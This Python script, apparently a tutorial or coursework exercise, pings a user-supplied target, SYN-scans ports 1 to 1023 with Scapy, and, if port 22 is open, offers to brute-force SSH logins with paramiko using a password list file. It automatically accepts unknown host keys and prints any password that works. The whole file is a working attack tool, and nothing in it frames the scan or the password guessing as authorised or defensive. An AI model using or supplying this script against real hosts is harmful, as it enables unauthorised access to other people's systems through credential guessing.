from scapy.all import *
import paramiko

# create the variable "Target" and assign a user input to it.
Target = input("Enter the IP address of the target host: ")

# create the variable "Registered_Ports"
Registered_Ports = range(1, 1024)

# create an empty list called "open_ports."
open_ports = []


# create the "scanport" function that requires the variable "port" as a single argument.
def scanport(port):

    # use "RandShort()" function from the Scapy library
    src_port = RandShort()

    try:
        # set "conf.verb" to 0 to prevent from printing unwnted mesages
        conf.verb = 0

        # create a Synchronisation Packet
        syn_pkt = sr1(IP(dst=Target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)

    except sr.TimeoutError:
        print(f"Timeout occurred while sending/receiving SYN packet.")
        return False

    except Exception as e_outer:
        print(f"Error occurred while getting syn_pkt: {e_outer}")
        return False

    # check if the Synchronization Packet exists.
    if syn_pkt is not None:

        # check if it has a TCP layer
        if syn_pkt.haslayer(TCP):

            # check if its ".flags" are equal to 0x12
            if syn_pkt[TCP].flags == 0x12:

                try:
                    # send an RST flag to close the active connection and return True
                    sr(IP(dst=Target) / TCP(sport=src_port, dport=port, flags="R"), timeout = 2)
                    return True

                except Exception as e:
                    logging.error(f"Error occurred while sending RST packet: {e}")
                    return False
            else:
                return False
        else:
           return False
    else:
        return False


# function that checks target availability
def target_availability(target):

    # implement "try" and "except" to catch exceptions when sending ICMP
    try:
        # set the "conf.verb" to 0 inside the "try' block
        conf.verb = 0

        # send an ICMP packet to the target with a timeout of 3
        icmp_pkt = sr1(IP(dst=target) / ICMP(), timeout=3)

        # if icmp response is not empty and have type 0 (echo reply) return True
        if icmp_pkt is not None and icmp_pkt[ICMP].type == 0:
            print(f"Target: {target} is available")
            print(f"Response msg: {icmp_pkt}")
            return True
        else:
            print(f"Target: {target} is not available")
            return False

    # if the exception occurs in the block, catch it as a variable
    except Exception as e:

        # print the exception and return a False.
        print(f"Error while sending/receiving ICMP occurred: {e}")
        return False


# The BruteForce function
def BruteForce(port):

    # use the "with" method to open the "PasswordList.txt"
    with open("PasswordList.txt", "r") as f:

        # assign the password value to a password variable
        passwords = f.read().splitlines()

    #  allow the user to select the SSH server's login username
    user = input("Enter the SSH server's login username: ")

    # new instance of the SSHClient
    SSHconn = paramiko.SSHClient()

    # automatically accept the host keys
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # loop through each line of passwords
    for line in passwords:

        # split the line into individual passwords
        line_passwords = line.split()

        # try each password in the line to establish an SSH connection
        for password in line_passwords:
            try:
                # attempt to connect to SSH using the current password
                SSHconn.connect(Target, port=int(port), username=user, password=password, timeout=1)

                # if successful, print the success message and close the connection
                print(f"Success! Password for user '{user}': {password}")
                SSHconn.close()
                break

            except Exception as e:

                # if connection fails with the current password, print an error message
                print(f"Password '{password}' failed. Error: {e}")


# IF statement that uses the availability check function
if target_availability(Target) is True:

    # loop that goes over the "ports" variable range
    for port in Registered_Ports:

        # "status" variable that is calls the port scanning function
        status = scanport(port)

        #  if the status variable is equal to True
        if status is True:

            # append open port to the list of ports
            open_ports.append(port)

            # print the port
            print(f"Port: {port} is open on {Target}")

    # after the loop finishes, print a message stating that the scan finished
    print("Scan finished")

    # if list of ports is not empty
    if open_ports:

        # check if there is port 22
        if 22 in open_ports:

            # if yes then ask if a user wants to perform a brute force attack
            answer = input("Port 22 is open. Do you want to perform a brute-force attack on that port? (Y/N): ")

            # perform a brute force attack
            if answer.upper() == "Y":
                BruteForce(22)

    # otherwise print message that no ports are available
    else:
        print(f"No ports available on {Target}")